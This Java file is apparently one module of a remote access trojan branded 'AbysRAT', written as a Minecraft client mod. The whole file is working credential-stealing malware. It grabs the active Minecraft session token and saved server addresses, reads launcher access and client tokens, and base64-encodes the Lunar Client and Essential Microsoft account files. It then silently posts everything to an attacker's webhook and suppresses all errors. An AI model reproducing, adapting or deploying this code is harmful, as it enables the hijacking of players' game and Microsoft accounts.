package dev.nfo.handlers;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonElement;

import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraft.util.Session;

public class Minecraft {
    private String webhookUrl;
    private File minecraftDir;
    private File lunarDir;
    private Gson gson;

    public Minecraft(String webhookUrl) {
        this.webhookUrl = webhookUrl;
        String appData = System.getenv("APPDATA");
        this.minecraftDir = new File(appData, ".minecraft");
        this.lunarDir = new File(appData, ".lunarclient");
        this.gson = new Gson();
    }

    public void collectAndSend() {
        try {
            Map<String, Object> data = new HashMap<>();
            
            // Current Minecraft session data
            Map<String, Object> sessionData = getCurrentSessionData();
            data.put("session", sessionData);
            
            // Minecraft Launcher data
            Map<String, Object> launcherData = getMinecraftLauncherData();
            data.put("launcher", launcherData);
            
            // Lunar Client data
            Map<String, Object> lunarData = getLunarClientData();
            data.put("lunar", lunarData);
            
            // Essential data
            Map<String, Object> essentialData = getEssentialData();
            data.put("essential", essentialData);
            
            // Send embed
            sendEmbed(data);
        } catch (Exception e) {
        }
    }

    private Map<String, Object> getCurrentSessionData() {
        Map<String, Object> result = new HashMap<>();
        try {
            net.minecraft.client.Minecraft mc = net.minecraft.client.Minecraft.getMinecraft();
            if (mc != null) {
                Session session = mc.getSession();
                if (session != null) {
                    Map<String, String> sessionInfo = new HashMap<>();
                    sessionInfo.put("username", session.getUsername());
                    sessionInfo.put("uuid", session.getPlayerID());
                    sessionInfo.put("token", session.getToken());
                    result.put("sessionInfo", sessionInfo);
                    
                    // Get saved servers
                    List<Map<String, String>> servers = new ArrayList<>();
                    try {
                        ServerList serverList = new ServerList(mc);
                        for (int i = 0; i < serverList.countServers(); i++) {
                            ServerData server = serverList.getServerData(i);
                            Map<String, String> serverInfo = new HashMap<>();
                            serverInfo.put("name", server.serverName);
                            serverInfo.put("ip", server.serverIP);
                            servers.add(serverInfo);
                        }
                        result.put("servers", servers);
                    } catch (Exception e) {
                        // Ignore server list errors
                    }
                }
            }
        } catch (Exception e) {
            // Ignore errors
        }
        return result;
    }

    private Map<String, Object> getMinecraftLauncherData() {
        Map<String, Object> result = new HashMap<>();
        try {
            File launcherProfiles = new File(minecraftDir, "launcher_profiles.json");
            if (launcherProfiles.exists()) {
                String content = new String(Files.readAllBytes(launcherProfiles.toPath()), StandardCharsets.UTF_8);
                JsonObject profiles = gson.fromJson(content, JsonObject.class);
                
                if (profiles.has("authenticationDatabase")) {
                    JsonObject authDb = profiles.getAsJsonObject("authenticationDatabase");
                    List<Map<String, String>> accounts = new ArrayList<>();
                    
                    for (Map.Entry<String, JsonElement> entry : authDb.entrySet()) {
                        JsonObject account = entry.getValue().getAsJsonObject();
                        if (account.has("profiles")) {
                            JsonObject profilesObj = account.getAsJsonObject("profiles");
                            for (Map.Entry<String, JsonElement> profileEntry : profilesObj.entrySet()) {
                                JsonObject profile = profileEntry.getValue().getAsJsonObject();
                                Map<String, String> accountData = new HashMap<>();
                                
                                if (profile.has("displayName")) {
                                    accountData.put("username", profile.get("displayName").getAsString());
                                }
                                if (profile.has("accessToken")) {
                                    accountData.put("accessToken", profile.get("accessToken").getAsString());
                                }
                                if (profile.has("clientToken")) {
                                    accountData.put("clientToken", profile.get("clientToken").getAsString());
                                }
                                if (profileEntry.getKey() != null) {
                                    accountData.put("uuid", profileEntry.getKey());
                                }
                                
                                if (!accountData.isEmpty()) {
                                    accounts.add(accountData);
                                }
                            }
                        }
                    }
                    result.put("accounts", accounts);
                }
            }
            
            // Try to get username from options.txt
            File optionsFile = new File(minecraftDir, "options.txt");
            if (optionsFile.exists()) {
                String optionsContent = new String(Files.readAllBytes(optionsFile.toPath()), StandardCharsets.UTF_8);
                Pattern usernamePattern = Pattern.compile("username:([^\\n]+)");
                Matcher matcher = usernamePattern.matcher(optionsContent);
                if (matcher.find()) {
                    result.put("lastUsername", matcher.group(1).trim());
                }
            }
        } catch (Exception e) {
            // Ignore errors
        }
        return result;
    }

    private Map<String, Object> getLunarClientData() {
        Map<String, Object> result = new HashMap<>();
        try {
            String lunarPath = System.getProperty("user.home") + "\\.lunarclient\\settings\\game\\accounts.json";
            File lunarFile = new File(lunarPath);
            
            if (!lunarFile.exists()) {
                result.put("accountsBase64", "Not found");
                return result;
            }
            
            StringBuilder contentBuilder = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new FileReader(lunarFile))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    contentBuilder.append(line).append("\n");
                }
            }
            
            String content = contentBuilder.toString();
            String base64Content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
            result.put("accountsBase64", base64Content);
        } catch (Exception e) {
            result.put("accountsBase64", "Error: " + e.getMessage());
        }
        return result;
    }

    private Map<String, Object> getEssentialData() {
        Map<String, Object> result = new HashMap<>();
        try {
            // Get Minecraft data directory (same as minecraftDir)
            String essentialPath = minecraftDir.getAbsolutePath() + "\\essential\\microsoft_accounts.json";
            File essentialFile = new File(essentialPath);
            
            if (!essentialFile.exists()) {
                result.put("accountsBase64", "Not found");
                return result;
            }
            
            StringBuilder contentBuilder = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new FileReader(essentialFile))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    contentBuilder.append(line).append("\n");
                }
            }
            
            String content = contentBuilder.toString();
            String base64Content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
            result.put("accountsBase64", base64Content);
        } catch (Exception e) {
            result.put("accountsBase64", "Error: " + e.getMessage());
        }
        return result;
    }

    private void sendEmbed(Map<String, Object> data) {
        try {
            StringBuilder description = new StringBuilder();
            
            // Current Session section
            Map<String, Object> sessionData = (Map<String, Object>) data.get("session");
            if (sessionData != null) {
                if (sessionData.containsKey("sessionInfo")) {
                    @SuppressWarnings("unchecked")
                    Map<String, String> sessionInfo = (Map<String, String>) sessionData.get("sessionInfo");
                    if (sessionInfo != null && !sessionInfo.isEmpty()) {
                        description.append("**Current Session:**\n");
                        description.append("Username: `").append(sessionInfo.getOrDefault("username", "N/A")).append("`\n");
                        description.append("UUID: `").append(sessionInfo.getOrDefault("uuid", "N/A")).append("`\n");
                        description.append("Token: ```").append(sessionInfo.getOrDefault("token", "N/A")).append("```\n");
                        description.append("\n");
                    }
                }
                
                if (sessionData.containsKey("servers")) {
                    @SuppressWarnings("unchecked")
                    List<Map<String, String>> servers = (List<Map<String, String>>) sessionData.get("servers");
                    if (servers != null && !servers.isEmpty()) {
                        description.append("**Saved Servers:**\n");
                        for (Map<String, String> server : servers) {
                            description.append("`").append(server.getOrDefault("name", "Unknown")).append("`: `").append(server.getOrDefault("ip", "N/A")).append("`\n");
                        }
                        description.append("\n");
                    }
                }
            }
            
            // Minecraft Launcher section
            Map<String, Object> launcherData = (Map<String, Object>) data.get("launcher");
            if (launcherData != null && launcherData.containsKey("accounts")) {
                @SuppressWarnings("unchecked")
                List<Map<String, String>> accounts = (List<Map<String, String>>) launcherData.get("accounts");
                if (accounts != null && !accounts.isEmpty()) {
                    description.append("**Minecraft Launcher:**\n");
                    for (Map<String, String> account : accounts) {
                        description.append("Username: `").append(account.getOrDefault("username", "N/A")).append("`\n");
                        if (account.containsKey("uuid")) {
                            description.append("UUID: `").append(account.get("uuid")).append("`\n");
                        }
                        if (account.containsKey("accessToken")) {
                            String token = account.get("accessToken");
                            description.append("Token: `").append(token.length() > 50 ? token.substring(0, 50) + "..." : token).append("`\n");
                        }
                        description.append("\n");
                    }
                }
            }
            
            // Lunar Client section
            Map<String, Object> lunarData = (Map<String, Object>) data.get("lunar");
            if (lunarData != null && lunarData.containsKey("accountsBase64")) {
                String base64Content = (String) lunarData.get("accountsBase64");
                description.append("**Lunar Client:**\n");
                description.append("```").append(base64Content).append("```\n\n");
            }
            
            // Essential section
            Map<String, Object> essentialData = (Map<String, Object>) data.get("essential");
            if (essentialData != null && essentialData.containsKey("accountsBase64")) {
                String base64Content = (String) essentialData.get("accountsBase64");
                description.append("**Essential:**\n");
                description.append("```").append(base64Content).append("```\n\n");
            }
            
            if (description.length() == 0) {
                description.append("No Minecraft accounts found.");
            }
            
            String embedJson = buildEmbedJson(description.toString());
            sendWebhook(embedJson);
        } catch (Exception e) {
            // Ignore errors
        }
    }

    private String buildEmbedJson(String description) {
        int color = new Random().nextInt(0xFFFFFF);
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
        sdf.setTimeZone(java.util.TimeZone.getTimeZone("UTC"));
        String timestamp = sdf.format(new Date());
        
        return "{" +
            "\"username\":\"AbysRAT\"," +
            "\"avatar_url\":\"https://i.imgur.com/ovwcNwY.png\"," +
            "\"embeds\":[{" +
            "\"title\":\"Minecraft Accounts\"," +
            "\"color\":" + color + "," +
            "\"description\":\"" + escapeJson(description) + "\"," +
            "\"footer\":{\"text\":\"Abys Private Edition\"}," +
            "\"timestamp\":\"" + timestamp + "\"" +
            "}]" +
            "}";
    }

    private String escapeJson(String str) {
        if (str == null) return "";
        return str.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t");
    }

    private void sendWebhook(String json) {
        try {
            URL url = new URL(webhookUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setRequestProperty("User-Agent", "AbysRAT/1.0");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            
            try (OutputStream outputStream = connection.getOutputStream()) {
                byte[] jsonBytes = json.getBytes(StandardCharsets.UTF_8);
                outputStream.write(jsonBytes);
                outputStream.flush();
            }
            
            connection.getResponseCode();
            connection.disconnect();
        } catch (Exception e) {
        }
    }
}
